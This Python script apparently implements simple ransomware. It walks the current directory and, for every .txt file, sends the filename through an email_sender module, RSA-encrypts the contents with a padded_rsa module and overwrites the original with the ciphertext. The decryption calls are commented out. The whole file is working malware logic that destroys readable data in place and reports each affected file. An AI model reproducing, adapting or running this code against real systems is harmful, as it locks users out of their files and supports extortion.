import os
from os import listdir
from os.path import isfile, join

from nbformat import write
import padded_rsa
import email_sender


def writeFile(path, content):
    f = open(path, "w+", encoding='utf-8')
    f.write(content)


def encryptFile(path, file_content, filename):
    email_sender.send_mail(filename)
    encrypted_content = padded_rsa.encrypt_rsa(file_content)
    # print(encrypted_content)
    ascii_lis = []
    for i in range(0, len(encrypted_content), 8):
        ascii_lis.append(encrypted_content[i: i+8])

    encrypted_ascii = ''
    for i in ascii_lis:
        encrypted_ascii += chr(int(i, 2))

    # print(encrypted_ascii)
    writeFile(path, encrypted_ascii)
    # decrypted_content = padded_rsa.decrypt_rsa(encrypted_content)
    # print(decrypted_content)
    # writeFile(path, decrypted_content)


def openFiles(path, filename):
    f = open(path, "r+")
    content = f.read()
    binary_content = ' '.join(format(ord(x), 'b') for x in content)
    ascii_string = "".join([chr(int(binary, 2))
                            for binary in binary_content.split(" ")])

    encryptFile(path, content, filename)
    # print(binary_content)
    # print(ascii_string)


cwd = os.getcwd()
onlyfiles = [os.path.join(cwd, f) for f in os.listdir(cwd) if
             os.path.isfile(os.path.join(cwd, f))]

for i in onlyfiles:
    filenames = i.split("\\")
    filename = filenames[-1]
    if i[-4:] == ".txt":
        openFiles(i, filename)
    # print(filename)
    # openFiles(i)
    # break
# print(onlyfiles)
